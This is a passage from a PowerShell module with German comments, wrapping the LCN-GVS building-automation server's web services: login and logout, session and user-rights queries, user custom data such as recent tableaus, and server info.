                                (New-Event -SourceIdentifier "dimmingCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "changeBrightnessCommandCompleted" -Action {
                                (New-Event -SourceIdentifier "changeBrightnessCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "absRegulatorCommandCompleted" -Action {
                                (New-Event -SourceIdentifier "absRegulatorCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null

                            Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "relRegulatorCommandCompleted" -Action {
                                (New-Event -SourceIdentifier "relRegulatorCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                            } | Out-Null
                        }

                        #endregion
                    }
                    else
                    {
                        Write-Error -Message $Script:LocalizedData.ErrorMessage0
                    }
                }
                else
                {
                    # Benutzer abmelden, wenn eine Benutzeranmeldung vorliegt
                    if ($Script:LCNGVSSession.isSuccess) { $Script:authSvc.Logout() }

                    # Url kontrollieren
                    if ( -not ($Script:authSvc.Url -eq ($Uri.AbsoluteUri + "/WebServices/Authentification1.asmx")))
                    {
                        $Script:authSvc.Url = $Uri.AbsoluteUri + "/WebServices/Authentification1.asmx"
                        $Script:Logs1Svc.Url = $Uri.AbsoluteUri + "/WebServices/Log1.asmx"
                        $Script:Status1Svc.Url = $Uri.AbsoluteUri + "/WebServices/Status1.asmx"
                        $Script:MacroServer1Svc.Url = $Uri.AbsoluteUri + "/WebServices/MacroServer1.asmx"
                        $Script:MonitoringServer1Svc.Url = $Uri.AbsoluteUri + "/WebServices/MonitoringServer1.asmx"
                        $Script:Tableau1Svc.Url = $Uri.AbsoluteUri + "/WebServices/Tableau1.asmx"
                        $Script:Timer1Svc.Url = $Uri.AbsoluteUri + "/WebServices/Timer1.asmx"
                        $Script:AppSiriSvc.Url = $Uri.AbsoluteUri + "/WebServices/AppSiri1.asmx"
                    }

                    # Neu mit dem LCN-GVS verbinden, und den CookieContainer austauschen.
                    $Script:LCNGVSSession = $Script:authSvc.Login($Credential.UserName, $Credential.GetNetworkCredential().Password, $CreatePersistentCookie) # Anmeldung
                    $Script:Logs1Svc.CookieContainer = $Script:authSvc.CookieContainer
                    $Script:Status1Svc.CookieContainer = $Script:authSvc.CookieContainer
                    $Script:MacroServer1Svc.CookieContainer = $Script:authSvc.CookieContainer
                    $Script:MonitoringServer1Svc.CookieContainer = $Script:authSvc.CookieContainer
                    $Script:Tableau1Svc.CookieContainer = $Script:authSvc.CookieContainer
                    $Script:Timer1Svc.CookieContainer = $Script:authSvc.CookieContainer
                    $Script:AppSiriSvc.CookieContainer = $Script:authSvc.CookieContainer
                }
                #endregion
            }
            catch [System.Exception]
            {
                Write-Error $_
            }
            finally
            {
                if ($Script:LCNGVSSession)
                {
                    $VersionString = (Get-LCNGVSServerInfo).VersionString

                    if ($oldSession)
                    {
                        if ($oldSession.versionString -notcontains $VersionString)
                        {
                            Write-Warning -Message "Different server versions can lead to malfunctions. Please restart PowerShell and log in to the GVS again."
                        }
                    }

                    $Script:LCNGVSSession | Add-Member -MemberType NoteProperty -Name Credential -Value $Credential
                    $Script:LCNGVSSession | Add-Member -MemberType NoteProperty -Name VersionString -Value $VersionString
                    $Script:LCNGVSSession
                }
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Melden Sie sich vom LCN-GVS Server ab.
    .DESCRIPTION
        Mit diesem Befehl melden Sie sich vom LCN-GVS Server ab.
    .EXAMPLE
        Disconnect-LCNGVS
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
#>
function Disconnect-LCNGVS # Alias: 'Logout-LCNGVSServer'
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Disconnect-LCNGVSServer',
                  ConfirmImpact='Medium')]
    [Alias('Logout-LCNGVSServer')]
    [OutputType()]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.DisconnectLCNGVS))
        {
            if ($Script:LCNGVSSession.isSuccess)
            {
                try
                {
                    $Script:authSvc.Logout()
                    $Script:LCNGVSSession.isSuccess = $false
                }
                catch [System.Exception]
                {
                    Write-Error -Message $_
                }
                finally
                {
                    $Script:LCNGVSSession
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Melden Sie sich vom LCN-GVS Server ab.
    .DESCRIPTION
        Mit diesem Befehl melden Sie sich vom LCN-GVS Server ab.
    .EXAMPLE
        Disconnect-LCNGVSAsync
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVS
        Get-LCNGVSSession
        Get-LCNGVSUserRights
#>
function Disconnect-LCNGVSAsync # Alias: 'Logout-LCNGVSServerAsync'
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Disconnect-LCNGVSServer',
                  ConfirmImpact='Medium')]
    [Alias('Logout-LCNGVSServerAsync')]
    [OutputType()]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.DisconnectLCNGVS))
        {
            if ($Script:LCNGVSSession.isSuccess)
            {
                try
                {
                    $Script:authSvc.LogoutAsync()
                }
                catch [System.Exception]
                {
                    Write-Error -Message $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft die Sitzungsinformationen ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die aktuelle Sitzungsinformation anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSSession
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSUserRights
#>
function Get-LCNGVSSession # Alias: 'Get-LoginResult'
{
    [CmdletBinding(DefaultParameterSetName='Default',
        SupportsShouldProcess=$true,
        PositionalBinding=$false,
        HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSSession',
        ConfirmImpact='Medium')]
    [Alias('Get-LoginResult')]
    [OutputType()]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSSession))
        {
            if ($Script:LCNGVSSession.isSuccess)
            {
                try
                {
                    if ($Script:LCNGVSSession)
                    {
                        $Script:LCNGVSSession
                    }
                    else
                    {
                        Write-Error -Message $Script:LocalizedData.ErrorMessage1
                    }
                }
                catch [System.Exception]
                {
                    Write-Error -Message $_
                }
                finally
                {
                    #$Script:LCNGVSSession
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft Ihre Benutzerrechte ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die aktuellen Benutzerrechte anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSUserRightList
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSSession
#>
function Get-LCNGVSUserRightList # Alias: 'Get-UserRights'
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSUserRights',
                  ConfirmImpact='Medium')]
    [Alias('Get-UserRights','Get-LCNGVSUserRights')]
    [OutputType([String[]])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSUserRights))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $UserRights = $Script:LCNGVSSession.UserRights
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $UserRights
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Prueft ob der Benutzer ueber das angegebene Recht verfuegt.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ueberpruefen, ob der Benutzer ueber das angegebene Recht verfuegt.
    .EXAMPLE
        Test-LCNGVSUserRight -UserRight MacroManagementRight
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSSession
        Get-LCNGVSUserRights
#>
function Test-LCNGVSUserRight # Alias: 'Check-UserRight'
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Test-LCNGVSUserRight',
                  ConfirmImpact='Medium')]
    [Alias('Check-UserRight')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.PowerShellModul.UserRight[]] $UserRight
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.CheckLCNGVSUserRight))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    foreach ($AuthorizationRule in $UserRight)
                    {
                        $Script:LCNGVSSession.UserRights.Contains($AuthorizationRule.ToString())
                    }
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# -----------------------------------------------
# LCNGVS.Authentification.CustomData
# -----------------------------------------------

<#
    .SYNOPSIS
        Ruft Ihre kuerzlich geoeffneten Tableaus ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Liste der kuerzlich geoeffneten Tableaus des Benutzers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSRecentTableauList
    .LINK
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSRecentTableauList
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSRecentTableauList',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.StringProperty[]])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSRecentTableauList))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Strings = $Script:LCNGVSSession.CustomData.Strings
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Strings | Where-Object -Property name -EQ -Value "RecentTableauUri"
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft das letzte geoeffnete Tableau ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie das letzte geoeffneten Tableau des Benutzers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSLastTableauUri
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSLastTableauUri
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSLastTableauUri',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.StringProperty[]])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSLastTableauUri))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Strings = $Script:LCNGVSSession.CustomData.Strings
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Strings | Where-Object -Property name -EQ -Value "LastTableauUri"
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Set das letzte geoeffnete Tableau ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie das letzte geoeffneten Tableau des Benutzers festlegen.
    .EXAMPLE
        Set-LCNGVSLastTableauUri -Tableau $Tableau
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Set-LCNGVSLastTableauUri
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Tableau.Tableau] $Tableau
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSLastTableauUri))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    ((Get-LCNGVSSession).CustomData.Strings | Where-Object -Property name -EQ -Value "LastTableauUri").Value = Create-TableauUri -Tableau $Tableau
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    Set-LCNGVSCustomData -CustomData (Get-LCNGVSSession).CustomData
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft Schnelltableaus des Benutzers ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Schnelltableaus des Benutzers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSQuickTableauUri
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSQuickTableauUri
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSLastTableauUri',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.StringProperty[]])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSLastTableauUri))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Strings = $Script:LCNGVSSession.CustomData.Strings
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Strings | Where-Object -Property name -EQ -Value QuickTableauUri
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft die Benutzerdaten des Benutzers ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Benutzerdaten des Benutzers anzeigen lassen.
        U.a. werden die kuerzlich geoeffneten Tableaus angezeigt, aber auch die Schnelltableaus.
    .EXAMPLE
        Get-LCNGVSCustomData
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSCustomData
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.CustomData])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSCustomData))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $CustomData = $Script:LCNGVSSession.CustomData
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $CustomData
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Erstellt neue Benutzerdaten des Benutzers.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Benutzerdaten des Benutzers neu erstellen.
        U.a. werden die kuerzlich geoeffneten Tableaus, aber auch die Schnelltableaus festgelegt.
    .EXAMPLE
        New-LCNGVSCustomData
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
#>
function New-LCNGVSCustomData
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/New-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.CustomData])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.NewLCNGVSCustomData))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $CustomData = [LCNGVS.Authentification.CustomData]::new()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $CustomData
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Setzt die Benutzerdaten des Benutzers.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Benutzerdaten des Benutzers setzen lassen.
        U.a. werden die kuerzlich geoeffneten Tableaus, aber auch die Schnelltableaus festgelegt.
    .EXAMPLE
        Set-LCNGVSCustomData -CustomData $CustomData
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Set-LCNGVSCustomData
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Authentification.CustomData] $CustomData
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.SetLCNGVSCustomData))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:authSvc.SetUserCustomData($CustomData)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# -----------------------------------------------
# LCNGVS.Authentification.ServerInfo
# -----------------------------------------------

<#
    .SYNOPSIS
        Ruft die Informationen des LCN-GVS-Servers ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Informationen des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerInfo
    .LINK
        Get-LCNGVSServerInfoAsync
#>
function Get-LCNGVSServerInfo
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-ServerInfo')]
    [OutputType([LCNGVS.Authentification.ServerInfo])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSServerInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $ServerInfo = $Script:authSvc.GetServerInfo()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $ServerInfo
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft die Informationen des LCN-GVS-Servers ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Informationen des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerInfoAsync
    .LINK
        Get-LCNGVSServerInfo
#>
function Get-LCNGVSServerInfoAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-ServerInfoAsync')]
    [OutputType([LCNGVS.Authentification.ServerInfo])]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSServerInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:authSvc.GetServerInfoAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# Webservice: Status1 - Einrichtung
# -----------------------------------------------
#region Komponente: Einrichtung

<#
